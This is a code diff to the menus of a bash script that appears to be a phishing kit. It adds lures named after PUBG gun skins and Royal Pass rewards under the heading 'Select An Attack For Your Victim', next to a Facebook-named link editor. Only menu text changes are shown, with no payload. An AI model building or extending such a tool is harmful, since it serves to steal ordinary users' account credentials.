@@ -295,7 +295,8 @@ tunnel_menu() {
 lovehacker_facebook() {
 	cat <<- EOF
 
-${RED}[${WHITE}01${RED}]${ORANGE} link Editor		
+${RED}[${WHITE}01${RED}]${ORANGE} link Editor M416		
+${RED}[${WHITE}02${RED}]${ORANGE} link Editor RoyalPass 17		
 	EOF
 
 	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
@@ -318,9 +319,9 @@ ${RED}[${WHITE}01${RED}]${ORANGE} link Editor
 main_menu() {
 	{ clear; banner; echo; }
 	cat <<- EOF
-${RED} Select An Attack For Your Victim
-${RED}[${WHITE}01${ORANGE}] Pubg Gun Skin M416
-${RED}[${WHITE}02${ORANGE}] Pubg Royal Pass 17
+${MAGENTA} Select An Attack For Your Victim
+${RED}[${WHITE}01${RED}] Pubg Gun Skin M416
+${RED}[${WHITE}02${RED}] Pubg Royal Pass 17
 ${RED}[${WHITE}99${RED}]${ORANGE} About
 ${RED}[${WHITE}00${RED}]${ORANGE} Exit
 
